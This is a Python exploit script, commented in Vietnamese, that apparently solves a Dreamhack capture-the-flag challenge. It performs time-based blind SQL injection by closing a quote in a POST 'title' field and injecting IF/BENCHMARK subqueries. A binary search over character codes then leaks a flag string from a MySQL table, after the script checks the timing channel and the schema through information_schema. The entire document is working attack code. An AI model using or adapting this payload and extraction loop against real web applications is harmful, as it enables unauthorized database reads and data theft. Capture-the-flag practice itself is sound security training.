import requests, time

BASE = "http://host8.dreamhack.games:9847/"
TIMEOUT = 20
THRESH = 1.0  # ngưỡng để nhận biết có delay (~2s ở host của bạn)

def post(title, author="x"):
    t0 = time.time()
    r = requests.post(BASE, data={"title": title, "author": author}, timeout=TIMEOUT)
    return time.time() - t0

def delayed_if(cond_sql: str) -> bool:
    """
    cond_sql: biểu thức/điều kiện MySQL trả về TRUE/FALSE.
    Ví dụ: "1=1" hoặc "EXISTS(SELECT 1 FROM requests WHERE book_title='FLAG')"
    """
    payload = (
        "a', (SELECT IF(({cond}),BENCHMARK(5000000,MD5(1)),0)) -- "
    ).format(cond=cond_sql)
    dt = post(payload)
    # print(cond_sql, dt)  # bật debug nếu cần
    return dt > THRESH

def sanity_checks():
    # 1) Kênh timing hoạt động?
    fast = not delayed_if("1=0")
    slow = delayed_if("1=1")
    if not (fast and slow):
        return False, "Time channel not stable (try increasing THRESH)"
    # 2) DB hiện tại tên gì?
    #    So sánh một ký tự đầu của database() để khỏi phải in ra trực tiếp
    #    (chỉ để chắc là subquery hoạt động)
    if not delayed_if("ASCII(SUBSTRING(DATABASE(),1,1))>0"):
        return False, "Cannot read DATABASE()"
    return True, "OK"

def table_exists(tname: str) -> bool:
    return delayed_if(
        f"EXISTS(SELECT 1 FROM information_schema.tables "
        f"WHERE table_schema=DATABASE() AND table_name='{tname}')"
    )

def row_exists_flag() -> bool:
    # hàng mang tiêu đề 'FLAG' có tồn tại?
    return delayed_if("EXISTS(SELECT 1 FROM requests WHERE book_title='FLAG')")

def leak_char_from_query(sql_expr: str, pos: int):
    """
    sql_expr: một scalar subquery/string expr, ví dụ:
      "(SELECT author FROM requests WHERE book_title='FLAG' LIMIT 1)"
    Trả về ký tự tại vị trí pos (1-based), hoặc None nếu hết.
    """
    # Nếu ký tự tại pos là rỗng/NULL -> dừng
    if not delayed_if(f"ASCII(SUBSTRING({sql_expr},{pos},1))>0"):
        return None
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi + 1)//2
        if delayed_if(f"ASCII(SUBSTRING({sql_expr},{pos},1))>={mid}"):
            lo = mid
        else:
            hi = mid - 1
    return chr(lo)

def leak_string(sql_expr: str, max_len=128):
    s = ""
    for i in range(1, max_len+1):
        ch = leak_char_from_query(sql_expr, i)
        if ch is None:
            break
        s += ch
        print(f"[+] {s}")
        if ch == "}":  # tối ưu cho flag
            break
    return s

def main():
    ok, msg = sanity_checks()
    if not ok:
        print("[!]", msg); return

    # Kiểm tra bảng 'requests'
    if not table_exists("requests"):
        print("[!] Table 'requests' không tồn tại. Đang liệt kê db/tables để tìm flag…")
        # Bạn có thể mở rộng: enumerate tên db, table, column bằng cùng kỹ thuật
        return

    # Kiểm tra có hàng 'FLAG' không (nhiều instance không seed sẵn hàng này)
    if not row_exists_flag():
        print("[!] Không có dòng book_title='FLAG'. Thử rút trực tiếp cột nào chứa 'DH{' trong bảng 'requests'…")
        # Thử tìm hàng chứa "DH{" trong cột author (nếu có)
        # Dùng EXISTS để đỡ NULL:
        has_dh = delayed_if(
            "EXISTS(SELECT 1 FROM requests WHERE INSTR(author, 'DH{')>0)"
        )
        if has_dh:
            print("[*] Tìm thấy 'DH{' trong requests.author, đang rút…")
            flag = leak_string("(SELECT author FROM requests WHERE INSTR(author,'DH{')>0 LIMIT 1)", 100)
            print("[*] FLAG =", flag)
        else:
            print("[!] Không tìm thấy 'DH{' trong requests.author. Có thể flag ở chỗ khác (env/file).")
        return

    # Nếu có hàng 'FLAG' như trong init.sql → rút author
    print("[*] Row 'FLAG' tồn tại, đang rút author…")
    flag = leak_string("(SELECT author FROM requests WHERE book_title='FLAG' LIMIT 1)", 100)
    print("[*] FLAG =", flag)

if __name__ == "__main__":
    main()